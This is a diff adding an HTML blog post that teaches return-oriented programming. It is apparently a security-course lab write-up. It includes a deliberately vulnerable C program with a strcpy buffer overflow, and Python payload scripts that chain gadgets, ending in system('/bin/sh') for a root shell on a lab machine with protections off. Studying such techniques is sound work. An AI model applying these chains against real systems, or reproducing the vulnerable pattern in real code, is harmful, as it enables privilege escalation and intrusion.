@@ -1,0 +1,737 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="MobileOptimized" content="320">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="referrer" content="no-referrer">
+    <meta name="description" content="">
+
+    
+      <link href="https://fonts.googleapis.com/css?family=Open+Sans:400|Old+Standard+TT:400&display=swap" rel="stylesheet" media="print" type="text/css" onload="this.media='all'">
+    
+
+    <title>
+      
+      
+         Return-Oriented Programming 
+      
+    </title>
+    <link rel="canonical" href="https://chuang76.github.io/posts/rop/">
+
+    <style>
+  * {
+    border:0;
+    font:inherit;
+    font-size:100%;
+    vertical-align:baseline;
+    margin:0;
+    padding:0;
+    color: black;
+    text-decoration-skip: ink;
+  }
+
+  body {
+     
+     
+    font-family: 'Verdana'; 
+     
+     
+    font-size:17px;
+    line-height:160%;
+    color:#1d1313;
+    max-width:700px;
+    margin:auto;
+  }
+
+  p {
+    margin: 20px 0;
+  }
+
+  a img {
+    border:none;
+  }
+
+  img {
+    margin: 10px auto 10px auto;
+    max-width: 100%;
+    display: block;
+  }
+
+  .left-justify { float: left; }
+  .right-justify { float:right; }
+
+  pre, code {
+    font: 12px Consolas, "Liberation Mono", Menlo, Courier, monospace;
+    background-color: #f7f7f7;
+  }
+
+  code {
+    font-size: 12px;
+    padding: 4px;
+  }
+
+  pre {
+    margin-top: 0;
+    margin-bottom: 16px;
+    word-wrap: normal;
+    padding: 16px;
+    overflow: auto;
+    font-size: 85%;
+    line-height: 1.45;
+  }
+
+  pre>code {
+    padding: 0;
+    margin: 0;
+    font-size: 100%;
+    word-break: normal;
+    white-space: pre;
+    background: transparent;
+    border: 0;
+  }
+
+  pre code {
+    display: inline;
+    padding: 0;
+    margin: 0;
+    overflow: visible;
+    line-height: inherit;
+    word-wrap: normal;
+    background-color: transparent;
+    border: 0;
+  }
+
+  pre code::before,
+  pre code::after {
+    content: normal;
+  }
+
+  em,q,em,dfn {
+    font-style:italic;
+  }
+
+  .sans,html .gist .gist-file .gist-meta {
+    font-family:"Open Sans","Myriad Pro",Myriad,sans-serif;
+  }
+
+  .mono,pre,code,tt,p code,li code {
+    font-family:Menlo,Monaco,"Andale Mono","lucida console","Courier New",monospace;
+  }
+
+  .heading,.serif,h1,h2,h3 {
+    font-family:"Old Standard TT",serif;
+  }
+
+  strong {
+    font-weight:600;
+  }
+
+  q:before {
+    content:"\201C";
+  }
+
+  q:after {
+    content:"\201D";
+  }
+
+  del,s {
+    text-decoration:line-through;
+  }
+
+  blockquote {
+    font-family:"Old Standard TT",serif;
+    text-align:center;
+    padding:50px;
+  }
+
+  blockquote p {
+    display:inline-block;
+    font-style:italic;
+  }
+
+  blockquote:before,blockquote:after {
+    font-family:"Old Standard TT",serif;
+    content:'\201C';
+    font-size:35px;
+    color:#403c3b;
+  }
+
+  blockquote:after {
+    content:'\201D';
+  }
+
+  hr {
+    width:40%;
+    height: 1px;
+    background:#403c3b;
+    margin: 25px auto;
+  }
+
+  h1 {
+    font-size:35px;
+  }
+
+  h2 {
+    font-size:28px;
+  }
+
+  h3 {
+    font-size:22px;
+    margin-top:18px;
+  }
+
+  h1 a,h2 a,h3 a {
+    text-decoration:none;
+  }
+
+  h1,h2 {
+    margin-top:28px;
+  }
+
+  #sub-header, .date {
+    color:#403c3b;
+    font-size:13px;
+  }
+
+  #sub-header {
+    margin: 0 4px;
+  }
+
+  #nav h1 a {
+    font-size:35px;
+    color:#1d1313;
+    line-height:120%;
+  }
+
+  .posts_listing a,#nav a {
+    text-decoration: none;
+  }
+
+  li {
+    margin-left: 20px;
+  }
+
+  ul li {
+    margin-left: 5px;
+  }
+
+  ul li {
+    list-style-type: none;
+  }
+  ul li:before {
+    content:"\00BB \0020";
+  }
+
+  #nav ul li:before, .posts_listing li:before {
+    content:'';
+    margin-right:0;
+  }
+
+  #content {
+    text-align:left;
+    width:100%;
+    font-size:15px;
+    padding:60px 0 80px;
+  }
+
+  #content h1,#content h2 {
+    margin-bottom:5px;
+  }
+
+  #content h2 {
+    font-size:25px;
+  }
+
+  #content .entry-content {
+    margin-top:15px;
+  }
+
+  #content .date {
+    margin-left:3px;
+  }
+
+  #content h1 {
+    font-size:30px;
+  }
+
+  .highlight {
+    margin: 10px 0;
+  }
+
+  .posts_listing {
+    margin:0 0 50px;
+  }
+
+  .posts_listing li {
+    margin:0 0 25px 15px;
+  }
+
+  .posts_listing li a:hover,#nav a:hover {
+    text-decoration: underline;
+  }
+
+  #nav {
+    text-align:center;
+    position:static;
+    margin-top:60px;
+  }
+
+  #nav ul {
+    display: table;
+    margin: 8px auto 0 auto;
+  }
+
+  #nav li {
+    list-style-type:none;
+    display:table-cell;
+    font-size:15px;
+    padding: 0 20px;
+  }
+
+  #links {
+    display: flex;
+    justify-content: space-between;
+    margin: 50px 0 0 0;
+  }
+
+  #links :nth-child(1) {
+    margin-right:0.5em;;
+  }
+
+  #links :nth-child(2) {
+    margin-left:0.5em;;
+  }
+
+  #not-found {
+    text-align: center;
+  }
+
+  #not-found a {
+    font-family:"Old Standard TT",serif;
+    font-size: 200px;
+    text-decoration: none;
+    display: inline-block;
+    padding-top: 225px;
+  }
+
+  @media (max-width: 750px) {
+    body {
+      padding-left:20px;
+      padding-right:20px;
+    }
+
+    #nav h1 a {
+      font-size:28px;
+    }
+
+    #nav li {
+      font-size:13px;
+      padding: 0 15px;
+    }
+
+    #content {
+      margin-top:0;
+      padding-top:50px;
+      font-size:14px;
+    }
+
+    #content h1 {
+      font-size:25px;
+    }
+
+    #content h2 {
+      font-size:22px;
+    }
+
+    .posts_listing li div {
+      font-size:12px;
+    }
+  }
+
+  @media (max-width: 400px) {
+    body {
+      padding-left:20px;
+      padding-right:20px;
+    }
+
+    #nav h1 a {
+      font-size:22px;
+    }
+
+    #nav li {
+      font-size:12px;
+      padding: 0 10px;
+    }
+
+    #content {
+      margin-top:0;
+      padding-top:20px;
+      font-size:12px;
+    }
+
+    #content h1 {
+      font-size:20px;
+    }
+
+    #content h2 {
+      font-size:18px;
+    }
+
+    .posts_listing li div{
+      font-size:12px;
+    }
+  }
+
+  @media (prefers-color-scheme: dark) {
+    *, #nav h1 a {
+      color: #FDFDFD;
+    }
+
+    body {
+      background: #121212;
+    }
+
+    pre, code {
+      background-color: #262626;
+    }
+
+    #sub-header, .date {
+      color: #BABABA;
+    }
+
+    hr {
+      background: #EBEBEB;
+    }
+  }
+</style>
+
+
+    </head>
+
+  <body>
+    <section id=nav>
+      <h1><a href="https://chuang76.github.io/">Before Dawn</a></h1>
+      <ul>
+        
+      </ul>
+    </section>
+
+
+<section id=content>
+  <h1> Return-Oriented Programming </h1>
+
+  
+    <div id=sub-header>
+      February 2021 
+    </div>
+  
+
+  <div class="entry-content">
+    <p>In the previous <a href="https://chuang76.github.io/posts/return-to-libc/">post</a>, we showed how to launch a return-to-libc attack, which chains two functions: system() and exit(). However, it is limited if we want to chain more functions to launch more complicated attacks. In 2001, Nergal extended the return-to-libc attack in <a href="http://phrack.org/issues/58/4.html">Phrack Magazine</a>. In 2007, Hovav Shacham published Return-Oriented Programming (ROP), a generalized technique that chains several code chunks (gadgets) to accomplish the exploit. In this article, we&rsquo;ll study how ROP works.</p>
+<h2 id="setup">Setup</h2>
+<p>Environment</p>
+<ol>
+<li>Google cloud virtual machine: Ubuntu 20.04</li>
+<li>Linux kernel version: 5.4.0</li>
+<li>Create a symbolic link from “/bin/zsh” to “/bin/sh” since /bin/dash in most Ubuntu systems prevents itself from being executed in a Set-UID process</li>
+<li>Disable ASLR and Stackguard protection, but make the stack non-executable (our purpose of the experiment)</li>
+</ol>
+<h2 id="chain-function-calls-without-arguments">Chain function calls without arguments</h2>
+<p>We first show how to chain function calls without arguments. Here is a vulnerable program called rop.c. Our goal is to invoke the function foo() in the following program 10 times based on a crafted stack frame.</p>
+<pre><code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+
+int bof(char* str)
+{
+	char buffer[100]; 
+	unsigned int* framep; 
+
+	asm(&quot;movl %%ebp, %0&quot; : &quot;=r&quot; (framep));             // copy ebp 
+	printf(&quot;ebp value = 0x%x\n&quot;, (unsigned)framep); 
+	printf(&quot;buffer address = 0x%x\n&quot;, (unsigned)buffer); 
+
+	strcpy(buffer, str);                               // buffer overflow 
+
+	return 1; 
+}
+
+void foo() {
+	static int i = 0; 
+	printf(&quot;function foo() is called %d times\n&quot;, ++i);
+}
+
+void helper(int x) {
+	printf(&quot;helper()'s argument = 0x%x\n&quot;, x);
+}
+
+int main(int argc, char** argv)
+{
+	char input[1000]; 
+	FILE* badfile; 
+
+	char* shell = getenv(&quot;my_shell&quot;); 
+	if (shell)
+		printf(&quot;shell = %s, address = 0x%x\n&quot;, shell, (unsigned int)shell); 
+
+	badfile = fopen(&quot;badfile&quot;, &quot;r&quot;); 
+	fread(input, sizeof(char), 1000, badfile); 
+
+	bof(input); 
+
+	printf(&quot;return properly\n&quot;);
+	return 1; 
+}
+</code></pre><p>According to the discussion in the previous <a href="https://chuang76.github.io/posts/return-to-libc/">post</a>, the stack should looks like this:</p>
+<p><img src="https://github.com/chuang76/image/blob/master/seed5-9.PNG?raw=true" alt=""></p>
+<p>And we need to find out</p>
+<ol>
+<li>the address of function foo()</li>
+<li>the address of function exit()</li>
+<li>the offset between the address of buffer and the old ebp</li>
+</ol>
+<p>To get the offset, we can execute the program to display the address of buffer and the ebp value. To get where is the address of function foo() and exit(), just set a breakpoint at main function and run the program via gdb debugger.</p>
+<p><img src="https://github.com/chuang76/image/blob/master/seed5-2.PNG?raw=true" alt=""></p>
+<p><img src="https://github.com/chuang76/image/blob/master/seed5-1.PNG?raw=true" alt=""></p>
+<p>As you can see, we need to cover 0xffffd118 - 0xffffd0a8 + 4 (the size of ebp), which equals to 116 bytes. The address of foo() is 0x565562d0 and the address of exit() is 0xf7e05f80. Okay, so now we can write a payload called test1.py as follows.</p>
+<pre><code>#!/usr/bin/python3
+
+import sys 
+
+content = bytearray(0xaa for i in range(1000))
+foo_addr = 0x565562d0 
+exit_addr = 0xf7e05f80
+start = 116 
+
+for i in range(0, 10):
+    content[start:start + 4] = (foo_addr).to_bytes(4, byteorder='little')
+    start += 4
+content[start:start + 4] = (exit_addr).to_bytes(4, byteorder='little')
+
+with open(&quot;badfile&quot;, &quot;wb&quot;) as f:
+    f.write(content)
+</code></pre><p>And here is the result, we invoke foo() 10 times successfully.</p>
+<p><img src="https://github.com/chuang76/image/blob/master/seed5-4.PNG?raw=true" alt=""></p>
+<h2 id="chain-function-calls-with-arguments-skip-prologue">Chain function calls with arguments: skip prologue</h2>
+<p>So let&rsquo;s consider a more complicated situation. We are going to call the function helper() with an argument. However, there is no space for any arguments in the stack frame. How can we achieve our goal? Before finishing strcpy() and entering into helper(), there are a function epilogue and a function prologue. Let&rsquo;s review their instruction as follows. The instructions are in Intel syntax. We can observe that the (old) ebp value can be decided by us (the value y) before entering helper()&rsquo;s prologue.</p>
+<pre><code>strcpy()'s epilogue: 
+mov esp, ebp                 -&gt; esp = x, ebp = x
+pop ebp                      -&gt; esp = x + 4, ebp = *(x) = y
+ret                          -&gt; esp = x + 8, ebp = y 
+
+helper()'s prologue:
+push ebp                     -&gt; esp = x + 8 - 4 = x + 4, ebp = y 
+mov ebp, esp                 -&gt; esp = x + 4, ebp = x + 4
+</code></pre><p>Here is a trick. We can bypass the entire prologue of helper() to solve the space problem. But how many bytes should be skipped? Or what address should we land on? We can disassemble helper() in the gdb debugger to figure out.</p>
+<p><img src="https://github.com/chuang76/image/blob/master/seed5-6.PNG?raw=true" alt=""></p>
+<p>Similarly, we need to find out the ebp value, the address of helper() and the address of exit().</p>
+<p><img src="https://github.com/chuang76/image/blob/master/seed5-8.PNG?raw=true" alt=""></p>
+<p><img src="https://github.com/chuang76/image/blob/master/seed5-5.PNG?raw=true" alt=""></p>
+<p>So we can write a payload called test2.py. Note that the ebp value can be decided by us. Since we need some space for an argument, the ebp value of the next stack frame should be added 12. If more arguments are required, the distance should be larger.</p>
+<pre><code>+---------------------+  
+|     1st argument    |     -&gt;   4 bytes
++---------------------+
+|   return address    |     -&gt;   4 bytes
++---------------------+
+|      old   ebp      |     -&gt;   4 bytes
++-------------------- +
+</code></pre><p>Here is the payload.</p>
+<pre><code>#!/usr/bin/python3 
+import sys 
+
+content = bytearray(0xaa for i in range(1000))
+ebp_value = 0xffffd138 
+helper_addr = 0x56556315 + 7     # skip prologue 
+exit_addr = 0xf7e05f80 
+start = 112
+
+for i in range(0, 10):
+
+    # ebp 
+    ebp_value += 12
+    content[start:start+4] = (ebp_value).to_bytes(4, byteorder='little')   
+    start += 4
+
+    # return address
+    content[start:start+4] = (helper_addr).to_bytes(4, byteorder='little') 
+    start += 4 
+
+    # first argument
+    content[start:start+4] = (0xaabbccdd).to_bytes(4, byteorder='little')   
+    start += 4
+
+# exit
+content[start:start+4] = (0xffffffff).to_bytes(4, byteorder='little')
+start += 4
+content[start:start+4] = (exit_addr).to_bytes(4, byteorder='little')
+start += 4
+content[start:start+4] = (0xaabbccdd).to_bytes(4, byteorder='little')
+
+with open(&quot;badfile&quot;, &quot;wb&quot;) as f:
+    f.write(content)
+</code></pre><p>We can invoke helper() 10 times with the argument 0xaabbccdd successfully.</p>
+<p><img src="https://github.com/chuang76/image/blob/master/seed5-7.PNG?raw=true" alt=""></p>
+<h2 id="chain-function-calls-with-arguments-leave-ret">Chain function calls with arguments: leave ret</h2>
+<p>Unfortunately, the prologue-skipping approach has a limitation. The reason is that nowadays library functions are invoked via Procedure Linkage Table (PLT). If you are not familiar with PLT, you can check my previous <a href="https://chuang76.github.io/posts/lazy_binding/">post</a> regards the lazy binding mechanism.</p>
+<p>Our goal is to jump to one function from another function. Let&rsquo;s say we&rsquo;d like to invoke the function B() from the function A(). Since the prologue of B() can not be skipped, we use an extra function to serve this task. This extra function is very simple, it does nothing, just leave a function prologue and a function epilogue. So we can get a rule with the calculation from the previous section.</p>
+<pre><code>A() -&gt; extra() -&gt; B()
+        |          |_ keep prologue, now ebp = y + 4
+        |
+        |_ skip prologue, ebp = y (y is decided by us)
+</code></pre><p>What is function extra() without prologue? Yes, it is a function epilogue! There are only two instructions in the function epilogue: <code>leave</code> and <code>ret</code>. According to the Intel developer&rsquo;s manual, the instruction leave = mov esp, ebp; pop ebp. We can generalize the rule as follows:</p>
+<pre><code>A() -&gt; any function epilogue -&gt; B()
+              |_ leave, ret 
+</code></pre><p>Image a situation: invoke a function C() from B() and invoke B() from A(). Assume that the initial ebp value is a + 4, let&rsquo;s re-calculate the esp value and esp value with leaveret approach. Note that when we operate the stack (push and pop), we actually access the memory.</p>
+<pre><code>A()'s epilogue:
+mov esp, ebp       -&gt; 1. esp = a + 4, ebp = a + 4 
+pop ebp            -&gt; 2. esp = a + 8, ebp = *(a + 4) = b (retrieve data)
+ret                -&gt; 3. esp = a + 12, ebp = b, eip = *(a + 8) 
+
+leave, ret 
+mov esp, ebp       -&gt; 4. esp = b, ebp = b
+pop ebp            -&gt; 5. esp = b + 4, ebp = *(b) = c (retrieve data)
+ret                -&gt; 6. esp = b + 8, ebp = c, eip = *(b + 4)
+
+B()'s prologue:
+push ebp           -&gt; 7. esp = (b + 8) - 4 = b + 4, ebp = c, *(b + 4) = c (store data)
+mov ebp, esp       -&gt; 8. esp = b + 4, ebp = b + 4
+
+B()'s epilogue:
+mov esp, ebp       -&gt; 9. esp = b + 4, ebp = b + 4 
+pop ebp            -&gt; 10. esp = b + 8, ebp = *(b + 4) = c (retrieve data)
+ret                -&gt; 11. esp = b + 12, ebp = c, eip = *(b + 8) 
+
+leave, ret 
+mov esp, ebp       -&gt; 12. esp = c, ebp = c 
+pop ebp            -&gt; 13. esp = c + 4, ebp = *(c) = d (retrieve data)
+ret                -&gt; 14. esp = c + 8, ebp = d, eip = *(c + 4) 
+
+C()'s prologue:
+push ebp           -&gt; 15. esp = (c + 8) - 4 = c + 4, ebp = d, *(c + 4) = d (store data)
+mov ebp, esp       -&gt; 16. esp = c + 4, ebp = c + 4 
+...
+</code></pre><p>So let&rsquo;s invoke the function printf() which is located in libc with the argument &ldquo;hello&rdquo;. According to the calculation above, we can design a stack frame as follows. Note that the addresses on the left side are not actual addresses. They are just served for us to understand the concept easily.</p>
+<p><img src="https://github.com/chuang76/image/blob/master/seed5-18.PNG?raw=true" alt=""></p>
+<p>Find out the address of the string &ldquo;hello&rdquo; (define it as an environment variable) and the initial ebp value.</p>
+<p><img src="https://github.com/chuang76/image/blob/master/seed5-10.PNG?raw=true" alt=""></p>
+<p>Find out the address of printf(), exit(), leave and ret via gdb debugger.</p>
+<p><img src="https://github.com/chuang76/image/blob/master/seed5-12.PNG?raw=true" alt=""></p>
+<p><img src="https://github.com/chuang76/image/blob/master/seed5-11.png?raw=true" alt=""></p>
+<p>Here is the payload.</p>
+<pre><code>#!/usr/bin/python3 
+import sys 
+
+start = 112
+hello_addr = 0xffffdf81
+ebp_value = 0xffffd128
+printf_addr = 0xf7e21de0 
+exit_addr = 0xf7e05f80 
+leaveret = 0x565562ce 
+
+content = bytearray(0xaa for i in range(1000))
+
+# bof() to leaveret 
+ebp_value += 8    
+content[start:start+4] = (ebp_value).to_bytes(4, byteorder='little') 
+start += 4
+content[start:start+4] = (leaveret).to_bytes(4, byteorder='little') 
+start += 4 
+
+# printf 
+for i in range(0, 10):
+    ebp_value += 16 
+    content[start:start+4] = (ebp_value).to_bytes(4, byteorder='little') 
+    start += 4 
+    content[start:start+4] = (printf_addr).to_bytes(4, byteorder='little') 
+    start += 4 
+    content[start:start+4] = (leaveret).to_bytes(4, byteorder='little') 
+    start += 4
+    content[start:start+4] = (hello_addr).to_bytes(4, byteorder='little') 
+    start += 4
+
+# exit 
+content[start:start+4] = (0xffffffff).to_bytes(4, byteorder='little') 
+start += 4
+content[start:start+4] = (exit_addr).to_bytes(4, byteorder='little') 
+
+with open(&quot;badfile&quot;, &quot;wb&quot;) as f:
+    f.write(content)
+</code></pre><p>So we can invoke the function printf() with the argument &ldquo;hello&rdquo; 10 times successfully.</p>
+<p><img src="https://github.com/chuang76/image/blob/master/seed5-13.PNG?raw=true" alt=""></p>
+<h2 id="exploit">Exploit</h2>
+<p>We have understood how ROP works. Let&rsquo;s use leaveret approach to launch an attack and get the root privilege of the shell! That is, invoke the function system() which is located in libc with an argument &ldquo;/bin/sh&rdquo;. Again, we need to find out</p>
+<ol>
+<li>the initial ebp value</li>
+<li>how many bytes will lead to an overflow</li>
+<li>the address of &ldquo;/bin/sh&rdquo;</li>
+<li>the address of system()</li>
+<li>the address of exit()</li>
+<li>the address of leaveret</li>
+</ol>
+<p><img src="https://github.com/chuang76/image/blob/master/seed5-14.PNG?raw=true" alt=""></p>
+<p><img src="https://github.com/chuang76/image/blob/master/seed5-15.PNG?raw=true" alt=""></p>
+<p><img src="https://github.com/chuang76/image/blob/master/seed5-16.PNG?raw=true" alt=""></p>
+<p>Here is the payload.</p>
+<pre><code>#!/usr/bin/python3 
+
+import sys 
+
+start = 112
+bin_sh_addr = 0xffffdf7f
+ebp_value = 0xffffd118
+system_addr = 0xf7e13420 
+exit_addr = 0xf7e05f80 
+leaveret =  0x565562ce 
+
+content = bytearray(0xaa for i in range(1000))
+
+# bof() to leaveret 
+ebp_value += 8    
+content[start:start+4] = (ebp_value).to_bytes(4, byteorder='little') 
+start += 4
+content[start:start+4] = (leaveret).to_bytes(4, byteorder='little') 
+start += 4 
+
+# system
+ebp_value += 16 
+content[start:start+4] = (ebp_value).to_bytes(4, byteorder='little') 
+start += 4 
+content[start:start+4] = (system_addr).to_bytes(4, byteorder='little') 
+start += 4 
+content[start:start+4] = (leaveret).to_bytes(4, byteorder='little') 
+start += 4
+content[start:start+4] = (bin_sh_addr).to_bytes(4, byteorder='little') 
+start += 4
+
+# exit 
+content[start:start+4] = (0xffffffff).to_bytes(4, byteorder='little') 
+start += 4
+content[start:start+4] = (exit_addr).to_bytes(4, byteorder='little') 
+
+with open(&quot;badfile&quot;, &quot;wb&quot;) as f:
+    f.write(content)
+</code></pre><p>After running the payload&hellip;voilà!</p>
+<p><img src="https://github.com/chuang76/image/blob/master/seed5-17.PNG?raw=true" alt=""></p>
+<h2 id="reference">Reference</h2>
+<ol>
+<li>Computer &amp; Internet Security: A Hands-on Approach, Wenliang Du.</li>
+</ol>
+
+  </div>
+
+  <div id=links>
+    
+      <a href="https://chuang76.github.io/posts/return-to-libc/">&laquo;&nbsp;Return-to-libc Attack</a>
+    
+    
+  </div>
+</section>
+
+  
+</body>
+</html>
+
+
+
